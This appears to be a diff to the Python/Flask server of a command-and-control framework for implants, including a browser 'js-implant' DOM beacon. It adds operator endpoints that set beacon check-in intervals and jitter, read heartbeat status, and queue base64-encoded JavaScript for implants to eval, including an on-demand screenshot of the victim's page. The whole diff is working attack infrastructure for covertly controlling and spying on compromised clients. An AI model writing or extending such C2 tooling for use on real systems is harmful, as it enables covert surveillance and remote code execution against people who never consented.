@@ -2211,6 +2211,114 @@ def getSidecarResult(requestId):
 
 
 #***************************************************************************
+# Atom Beacon Heartbeat API
+
+@app.route('/api/beacon/heartbeat', methods=['POST'])
+@app.route('/api/atom/heartbeat', methods=['POST'])
+@login_required
+def setAtomHeartbeat():
+    """Queue a heartbeat change task for a beacon (BEX, Atom, or DOM)."""
+    content = request.json
+    clientID = content.get('clientID')
+    baseInterval = content.get('baseInterval')
+    jitterPercent = content.get('jitterPercent')
+
+    if baseInterval is None or jitterPercent is None:
+        return "Missing baseInterval or jitterPercent", 400
+
+    try:
+        baseInterval = float(baseInterval)
+        jitterPercent = float(jitterPercent)
+    except (ValueError, TypeError):
+        return "Invalid numeric values", 400
+
+    if baseInterval < 0.5:
+        return "baseInterval must be >= 0.5", 400
+    if jitterPercent < 0 or jitterPercent > 100:
+        return "jitterPercent must be 0-100", 400
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    if client.clientType == 'js-implant':
+        # DOM beacon uses eval'd JavaScript — generate JS code that calls global functions
+        baseMsVal = baseInterval * 1000
+        jitterRange = (jitterPercent / 100) * baseMsVal
+        jsCode = (
+            f'updateTaskCheckInterval({baseMsVal});'
+            f'updateTaskCheckJitter({jitterRange},{-jitterRange});'
+            f'sendMetrics("/plugin/data/_system",JSON.stringify({{dataType:"heartbeat_status",data:{{success:true,baseInterval:{baseInterval},jitterPercent:{jitterPercent}}}}}));'
+        )
+        encoded = base64.b64encode(jsCode.encode('utf-8')).decode('utf-8')
+    else:
+        # BEX/Atom beacons use JSON task format
+        taskData = {
+            "type": "SET_HEARTBEAT",
+            "baseInterval": baseInterval,
+            "jitterPercent": jitterPercent
+        }
+        encoded = base64.b64encode(json.dumps(taskData).encode('utf-8')).decode('utf-8')
+
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "queued"}), 200
+
+
+@app.route('/api/beacon/heartbeat/<clientID>', methods=['GET'])
+@app.route('/api/atom/heartbeat/<clientID>', methods=['GET'])
+@login_required
+def getAtomHeartbeat(clientID):
+    """Get latest heartbeat status for a beacon (BEX or Atom)."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return jsonify({"found": False})
+
+    row = PluginData.query.filter_by(
+        clientID=client.uuid, pluginId='_system', dataType='heartbeat_status'
+    ).order_by(PluginData.id.desc()).first()
+
+    if not row:
+        return jsonify({"found": False})
+
+    return jsonify({
+        "found": True,
+        "data": json.loads(row.data),
+        "timeStamp": row.timeStamp.isoformat() if row.timeStamp else None,
+        "id": row.id
+    })
+
+
+#***************************************************************************
+# DOM Beacon Screenshot API
+
+@app.route('/api/dom/screenshot', methods=['POST'])
+@login_required
+def domScreenshot():
+    """Queue an on-demand screenshot task for a DOM beacon."""
+    content = request.json
+    clientID = content.get('clientID')
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    jsCode = 'sendScreenshot();'
+    encoded = base64.b64encode(jsCode.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+    return jsonify({"status": "queued"}), 200
+
+
+#***************************************************************************
 # Plugin API Routes
 
 @app.route('/api/plugins', methods=['GET'])
